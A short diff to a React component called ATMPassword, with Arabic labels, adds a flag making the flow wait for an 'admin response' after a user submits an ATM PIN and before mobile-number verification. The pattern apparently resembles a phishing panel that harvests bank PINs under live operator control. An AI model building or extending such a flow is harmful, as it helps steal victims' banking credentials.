@@ -55,6 +55,7 @@ export default function ATMPassword() {
       digitCode: pin,
       current: "كلمة مرور ATM",
       nextPage: "توثيق رقم الجوال",
+      waitingForAdminResponse: true,
     });
   };
 
